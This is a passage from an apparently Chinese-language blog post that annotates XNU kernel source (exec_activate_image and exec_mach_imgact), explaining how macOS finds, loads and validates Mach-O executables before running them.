class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * exec_activate_image</span><br><span class="line"> *</span><br><span class="line"> * Description:	Iterate through the available image activators, and activate</span><br><span class="line"> *		the image associated with the imgp structure.  We start with</span><br><span class="line"> *		the</span><br><span class="line"> *</span><br><span class="line"> * Parameters:	struct image_params *	Image parameter block</span><br><span class="line"> *</span><br><span class="line"> * Returns:	0			Success</span><br><span class="line"> *		EBADEXEC		The executable is corrupt/unknown</span><br><span class="line"> *	execargs_alloc:EINVAL		Invalid argument</span><br><span class="line"> *	execargs_alloc:EACCES		Permission denied</span><br><span class="line"> *	execargs_alloc:EINTR		Interrupted function</span><br><span class="line"> *	execargs_alloc:ENOMEM		Not enough space</span><br><span class="line"> *	exec_save_path:EFAULT		Bad address</span><br><span class="line"> *	exec_save_path:ENAMETOOLONG	Filename too long</span><br><span class="line"> *	exec_check_permissions:EACCES	Permission denied</span><br><span class="line"> *	exec_check_permissions:ENOEXEC	Executable file format error</span><br><span class="line"> *	exec_check_permissions:ETXTBSY	Text file busy [misuse of error code]</span><br><span class="line"> *	exec_check_permissions:???</span><br><span class="line"> *	namei:???</span><br><span class="line"> *	vn_rdwr:???			[anything vn_rdwr can return]</span><br><span class="line"> *	&lt;ex_imgact&gt;:???			[anything an imgact can return]</span><br><span class="line"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="title">exec_activate_image</span><span class="params">(<span class="keyword">struct</span> image_params *imgp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> nameidata *ndp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *excpath;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">int</span> resid;</span><br><span class="line">	<span class="keyword">int</span> once = <span class="number">1</span>;	<span class="comment">/* save SGUID-ness for interpreted files */</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> itercount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">proc_t</span> p = vfs_context_proc(imgp-&gt;ip_vfs_context);</span><br><span class="line"></span><br><span class="line">	error = execargs_alloc(imgp);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	</span><br><span class="line">	error = exec_save_path(imgp, imgp-&gt;ip_user_fname, imgp-&gt;ip_seg, &amp;excpath);</span><br><span class="line">	<span class="keyword">if</span> (error) &#123;</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Use excpath, which contains the copyin-ed exec path */</span></span><br><span class="line">	DTRACE_PROC1(exec, <span class="keyword">uintptr_t</span>, excpath);</span><br><span class="line"></span><br><span class="line">	MALLOC(ndp, <span class="keyword">struct</span> nameidata *, <span class="keyword">sizeof</span>(*ndp), M_TEMP, M_WAITOK | M_ZERO);</span><br><span class="line">	<span class="keyword">if</span> (ndp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		error = ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	NDINIT(ndp, LOOKUP, OP_LOOKUP, FOLLOW | LOCKLEAF | AUDITVNPATH1,</span><br><span class="line">		   UIO_SYSSPACE, CAST_USER_ADDR_T(excpath), imgp-&gt;ip_vfs_context);</span><br><span class="line"></span><br><span class="line">again:</span><br><span class="line">	error = namei(ndp); <span class="comment">//<span class="doctag">todo:</span>	详细流程先不看，研究下来感觉是路径的搜索</span></span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	imgp-&gt;ip_ndp = ndp;	<span class="comment">/* successful namei(); call nameidone() later */</span></span><br><span class="line">	imgp-&gt;ip_vp = ndp-&gt;ni_vp;	<span class="comment">/* if set, need to vnode_put() at some point */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Before we start the transition from binary A to binary B, make</span><br><span class="line">	 * sure another thread hasn't started exiting the process.  We grab</span><br><span class="line">	 * the proc lock to check p_lflag initially, and the transition</span><br><span class="line">	 * mechanism ensures that the value doesn't change after we release</span><br><span class="line">	 * the lock.</span><br><span class="line">	 */</span></span><br><span class="line">	proc_lock(p);</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;p_lflag &amp; P_LEXIT) &#123;</span><br><span class="line">		proc_unlock(p);</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line">	error = proc_transstart(p, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">	proc_unlock(p);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line"></span><br><span class="line">	error = exec_check_permissions(imgp);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy; avoid invocation of an interpreter overwriting the original */</span></span><br><span class="line">	<span class="keyword">if</span> (once) &#123;</span><br><span class="line">		once = <span class="number">0</span>;</span><br><span class="line">		*imgp-&gt;ip_origvattr = *imgp-&gt;ip_vattr;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//读取数据到内存中</span></span><br><span class="line">	error = vn_rdwr(UIO_READ, imgp-&gt;ip_vp, imgp-&gt;ip_vdata, PAGE_SIZE, <span class="number">0</span>,</span><br><span class="line">			UIO_SYSSPACE, IO_NODELOCKED,</span><br><span class="line">			vfs_context_ucred(imgp-&gt;ip_vfs_context),</span><br><span class="line">			&amp;resid, vfs_context_proc(imgp-&gt;ip_vfs_context));</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (resid) &#123;</span><br><span class="line">		<span class="built_in">memset</span>(imgp-&gt;ip_vdata + (PAGE_SIZE - resid), <span class="number">0x0</span>, resid);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">//到这里之前的代码主要做了两件事情</span></span><br><span class="line">  	<span class="comment">//1.根据路径查找文件</span></span><br><span class="line">  	<span class="comment">//2.将文件拷贝到内存中</span></span><br><span class="line">encapsulated_binary:</span><br><span class="line">	<span class="comment">/* Limit the number of iterations we will attempt on each binary */</span></span><br><span class="line">	<span class="keyword">if</span> (++itercount &gt; EAI_ITERLIMIT) &#123;</span><br><span class="line">		error = EBADEXEC;</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line">	&#125;</span><br><span class="line">	error = -<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; error == -<span class="number">1</span> &amp;&amp; execsw[i].ex_imgact != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">		<span class="comment">//这里对macho文件进行了解析</span></span><br><span class="line">		error = (*execsw[i].ex_imgact)(imgp);	<span class="comment">//<span class="doctag">todo:</span>调用了一个指针函数，exec_mach_imgact</span></span><br><span class="line">      	<span class="comment">//总共有三种函数</span></span><br><span class="line">      	<span class="comment">/*</span><br><span class="line">        struct execsw &#123;</span><br><span class="line">		int (*ex_imgact)(struct image_params *);</span><br><span class="line">		const char *ex_name;</span><br><span class="line">		&#125; execsw[] = &#123;</span><br><span class="line">		&#123; exec_mach_imgact,		"Mach-o Binary" &#125;,</span><br><span class="line">		&#123; exec_fat_imgact,		"Fat Binary" &#125;,</span><br><span class="line">		&#123; exec_shell_imgact,		"Interpreter Script" &#125;,</span><br><span class="line">		&#123; NULL, NULL&#125;</span><br><span class="line">&#125;;</span><br><span class="line">*/</span></span><br><span class="line">      	<span class="comment">//分别是osx支持的三种不同的可执行文件</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (error) &#123;</span><br><span class="line">            <span class="comment">/*出错处理*/</span></span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Call out to allow 3rd party notification of exec. </span><br><span class="line">	 * Ignore result of kauth_authorize_fileop call.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (error == <span class="number">0</span> &amp;&amp; kauth_authorize_fileop_has_listeners()) &#123;</span><br><span class="line">		kauth_authorize_fileop(vfs_context_ucred(imgp-&gt;ip_vfs_context),</span><br><span class="line">					KAUTH_FILEOP_EXEC,</span><br><span class="line">					(<span class="keyword">uintptr_t</span>)ndp-&gt;ni_vp, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">	proc_transend(p, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">bad_notrans:</span><br><span class="line">	<span class="keyword">if</span> (imgp-&gt;ip_strings)</span><br><span class="line">		execargs_free(imgp);</span><br><span class="line">	<span class="keyword">if</span> (imgp-&gt;ip_ndp)</span><br><span class="line">		nameidone(imgp-&gt;ip_ndp);</span><br><span class="line">	<span class="keyword">if</span> (ndp)</span><br><span class="line">		FREE(ndp, M_TEMP);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数主要做的事情就是寻找并拷贝<strong>可执行文件</strong>到内存中，并且根据可执行文件的类型调用不同的解析函数。osx总共支持三种可执行文件。他们各自有对应的处理函数。</p>
<ul>
<li><a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">mach-o</a>：exec_mach_imgact</li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%80%9A%E7%94%A8%E4%BA%8C%E8%BF%9B%E5%88%B6" target="_blank" rel="external">Fat Binary</a>：exec_fat_imgact</li>
<li>Interpreter Script：exec_shell_imgact</li>
</ul>
<h2 id="1-3_exec_mach_imgact">1.3 exec_mach_imgact</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * exec_mach_imgact</span><br><span class="line"> *</span><br><span class="line"> * Image activator for mach-o 1.0 binaries.</span><br><span class="line"> *</span><br><span class="line"> * Parameters;	struct image_params *	image parameter block</span><br><span class="line"> *</span><br><span class="line"> * Returns:	-1			not a fat binary (keep looking)</span><br><span class="line"> *		-2			Success: encapsulated binary: reread</span><br><span class="line"> *		&gt;0			Failure: error number</span><br><span class="line"> *		EBADARCH		Mach-o binary, but with an unrecognized</span><br><span class="line"> *					architecture</span><br><span class="line"> *		ENOMEM			No memory for child process after -</span><br><span class="line"> *					can only happen after vfork()</span><br><span class="line"> *</span><br><span class="line"> * Important:	This image activator is NOT byte order neutral.</span><br><span class="line"> *</span><br><span class="line"> * Note:	A return value other than -1 indicates subsequent image</span><br><span class="line"> *		activators should not be given the opportunity to attempt</span><br><span class="line"> *		to activate the image.</span><br><span class="line"> *</span><br><span class="line"> * TODO:	More gracefully handle failures after vfork</span><br><span class="line"> */</span><br><span class="line">static int</span><br><span class="line">exec_mach_imgact(struct image_params *imgp)</span><br><span class="line">&#123;</span><br><span class="line">	struct mach_header *mach_header = (struct mach_header *)imgp-&gt;ip_vdata;</span><br><span class="line">	proc_t			p = vfs_context_proc(imgp-&gt;ip_vfs_context);</span><br><span class="line">	int			error = 0;</span><br><span class="line">	task_t			task;</span><br><span class="line">	task_t			new_task = NULL; /* protected by vfexec */</span><br><span class="line">	thread_t		thread;</span><br><span class="line">	struct uthread		*uthread;</span><br><span class="line">	vm_map_t old_map = VM_MAP_NULL;</span><br><span class="line">	vm_map_t map;</span><br><span class="line">	load_return_t		lret;</span><br><span class="line">	load_result_t		load_result;</span><br><span class="line">	struct _posix_spawnattr *psa = NULL;</span><br><span class="line">	int			spawn = (imgp-&gt;ip_flags &amp; IMGPF_SPAWN);</span><br><span class="line">	int			vfexec = (imgp-&gt;ip_flags &amp; IMGPF_VFORK_EXEC);</span><br><span class="line">	int			p_name_len;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * make sure it's a Mach-O 1.0 or Mach-O 2.0 binary; the difference</span><br><span class="line">	 * is a reserved field on the end, so for the most part, we can</span><br><span class="line">	 * treat them as if they were identical. Reverse-endian Mach-O</span><br><span class="line">	 * binaries are recognized but not compatible.</span><br><span class="line"> 	 */</span><br><span class="line">    // 检测header里面的magic，是否符合macho文件的特征</span><br><span class="line">  	// NXSwapInt:PowerPC等平台中的二进制文件</span><br><span class="line">  	//MH_CIGAM    = 0xCEFAEDFE</span><br><span class="line">    //MH_CIGAM_64 = 0xCFFAEDFE</span><br><span class="line">	if ((mach_header-&gt;magic == MH_CIGAM) ||</span><br><span class="line">	    (mach_header-&gt;magic == MH_CIGAM_64)) &#123;</span><br><span class="line">		error = EBADARCH;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  	// 检测header里面的magic，是否符合macho文件的特征</span><br><span class="line">    // #define	MH_MAGIC	0xfeedface</span><br><span class="line">  	// #define MH_MAGIC_64 0xfeedfacf </span><br><span class="line">    // 通用的macho二进制文件，一般遇到都是这种</span><br><span class="line">	if ((mach_header-&gt;magic != MH_MAGIC) &amp;&amp;</span><br><span class="line">	    (mach_header-&gt;magic != MH_MAGIC_64)) &#123;</span><br><span class="line">		error = -1;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">  	// 检测macho的文件类型，文件类型必须是可执行文件</span><br><span class="line">   	// 还有一些其他的常见类型</span><br><span class="line">    // #define	MH_OBJECT	0x1		编译过程产生的obj文件</span><br><span class="line">    // #define	MH_CORE		0x4		崩溃时的dump文件</span><br><span class="line">	if (mach_header-&gt;filetype != MH_EXECUTE) &#123;</span><br><span class="line">		error = -1;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    // 获取macho的执行环境，cpu的平台与版本</span><br><span class="line">	if (imgp-&gt;ip_origcputype != 0) &#123;</span><br><span class="line">		/* Fat header previously had an idea about this thin file */</span><br><span class="line">		if (imgp-&gt;ip_origcputype != mach_header-&gt;cputype ||</span><br><span class="line">			imgp-&gt;ip_origcpusubtype != mach_header-&gt;cpusubtype) &#123;</span><br><span class="line">			error = EBADARCH;</span><br><span class="line">			goto bad;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		imgp-&gt;ip_origcputype = mach_header-&gt;cputype;</span><br><span class="line">		imgp-&gt;ip_origcpusubtype = mach_header-&gt;cpusubtype;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	task = current_task();</span><br><span class="line">	thread = current_thread();</span><br><span class="line">	uthread = get_bsdthread_info(thread);</span><br><span class="line"></span><br><span class="line">	if ((mach_header-&gt;cputype &amp; CPU_ARCH_ABI64) == CPU_ARCH_ABI64)</span><br><span class="line">		imgp-&gt;ip_flags |= IMGPF_IS_64BIT;</span><br><span class="line"></span><br><span class="line">	/* If posix_spawn binprefs exist, respect those prefs. */</span><br><span class="line">	psa = (struct _posix_spawnattr *) imgp-&gt;ip_px_sa;</span><br><span class="line">	if (psa != NULL &amp;&amp; psa-&gt;psa_binprefs[0] != 0) &#123;</span><br><span class="line">		int pr = 0;</span><br><span class="line">		for (pr = 0; pr &lt; NBINPREFS; pr++) &#123;</span><br><span class="line">			cpu_type_t pref = psa-&gt;psa_binprefs[pr];</span><br><span class="line">			if (pref == 0) &#123;</span><br><span class="line">				/* No suitable arch in the pref list */</span><br><span class="line">				error = EBADARCH;</span><br><span class="line">				goto bad;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			if (pref == CPU_TYPE_ANY) &#123;</span><br><span class="line">				/* Jump to regular grading */</span><br><span class="line">				goto grade;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			if (pref == imgp-&gt;ip_origcputype) &#123;</span><br><span class="line">				/* We have a match! */</span><br><span class="line">				goto grade;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		error = EBADARCH;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line">grade:</span><br><span class="line">  	//检测cpu平台</span><br><span class="line">	if (!grade_binary(imgp-&gt;ip_origcputype, imgp-&gt;ip_origcpusubtype &amp; ~CPU_SUBTYPE_MASK)) 	  &#123;</span><br><span class="line">		error = EBADARCH;</span><br><span class="line">		goto bad;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Copy in arguments/environment from the old process */</span><br><span class="line">    //获取环境变量和参数</span><br><span class="line">    //为vfork执行macho做准备</span><br><span class="line">	error = exec_extract_strings(imgp);</span><br><span class="line">	if (error)</span><br><span class="line">		goto bad;</span><br><span class="line"></span><br><span class="line">	error = exec_add_apple_strings(imgp);</span><br><span class="line">	if (error)</span><br><span class="line">		goto bad;</span><br><span class="line"></span><br><span class="line">	AUDIT_ARG(argv, imgp-&gt;ip_startargv, imgp-&gt;ip_argc, </span><br><span class="line">	    imgp-&gt;ip_endargv - imgp-&gt;ip_startargv);</span><br><span class="line">	AUDIT_ARG(envv, imgp-&gt;ip_endargv, imgp-&gt;ip_envc,</span><br><span class="line">	    imgp-&gt;ip_endenvv - imgp-&gt;ip_endargv);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * We are being called to activate an image subsequent to a vfork()</span><br><span class="line">	 * operation; in this case, we know that our task, thread, and</span><br><span class="line">	 * uthread are actually those of our parent, and our proc, which we</span><br><span class="line">	 * obtained indirectly from the image_params vfs_context_t, is the</span><br><span class="line">	 * new child process.</span><br><span class="line">	 */</span><br><span class="line">    // 